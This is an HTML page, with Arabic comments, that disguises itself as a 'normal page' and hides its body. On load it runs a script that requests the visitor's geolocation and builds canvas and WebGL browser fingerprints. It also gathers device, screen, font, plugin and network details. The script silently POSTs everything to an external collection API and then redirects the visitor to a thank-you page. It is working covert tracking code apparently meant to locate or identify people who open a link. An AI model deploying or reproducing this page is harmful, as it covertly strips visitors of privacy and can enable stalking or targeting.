<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة عادية</title>
    <style> body { display: none; } </style>
</head>
<body>
    <script>
        const apiUrl = 'https://your-secure-api.com/api/Collect';

        // === 1. استخراج اسم الجهاز ===
        async function parseDeviceName(ua) {
            if (navigator.userAgentData) {
                const hints = await navigator.userAgentData.getHighEntropyValues(["model", "brand"]);
                if (hints.model) return `${hints.brand} ${hints.model}`;
            }
            const patterns = [
                { name: 'Samsung Galaxy S24', pattern: /samsung.*sm-s92/i },
                { name: 'iPhone 15', pattern: /iphone.*15/i },
                { name: 'Android Device', pattern: /android/i }
            ];
            for (let p of patterns) if (p.pattern.test(ua)) return p.name;
            return /windows/i.test(ua) ? 'Windows PC' : 'Unknown';
        }

        // === 2. الموقع الجغرافي ===
        async function getGeolocation() {
            return new Promise(r => {
                if (!navigator.geolocation) return r({ error: 'غير مدعوم' });
                navigator.geolocation.getCurrentPosition(
                    pos => r({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => r({ error: 'مرفوض' })
                );
            });
        }

        // === 3. بصمة Canvas (الأقوى) ===
        function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('OSINT', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('OSINT', 4, 17);
            return canvas.toDataURL();
        }

        // === 4. بصمة WebGL ===
        function getWebGLFingerprint() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'غير مدعوم';
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        }

        // === 5. تجميع البصمة النهائية ===
        function hashCode(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return hash.toString(16);
        }

        function generateFingerprint() {
            const canvas = getCanvasFingerprint();
            const webgl = getWebGLFingerprint();
            const fonts = Array.from(document.fonts).map(f => f.family).join(',');
            const plugins = Array.from(navigator.plugins).map(p => p.name).join(',');
            const str = `${canvas}${webgl}${navigator.hardwareConcurrency}${screen.colorDepth}${fonts}${plugins}`;
            return hashCode(str);
        }

        // === 6. التنفيذ الرئيسي ===
        (async () => {
            try {
                const geo = await getGeolocation();
                const fingerprint = generateFingerprint();

                const data = {
                    clientUuid: crypto.randomUUID?.() || Date.now().toString(36),
                    deviceFingerprint: fingerprint,  // بديل MAC
                    ipAddress: '',
                    userAgent: navigator.userAgent,
                    deviceName: await parseDeviceName(navigator.userAgent),
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || 'غير متاح',
                    connectionType: navigator.connection?.type ?? 'unknown',
                    canvasFingerprint: getCanvasFingerprint().substring(0, 50) + '...',
                    webglRenderer: getWebGLFingerprint(),
                    geolocation: geo
                };

                await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                window.location.href = 'https://example.com/thank-you';
            } catch (e) {
                console.error('خطأ في الجمع:', e);
            }
        })();
    </script>
</body>
</html>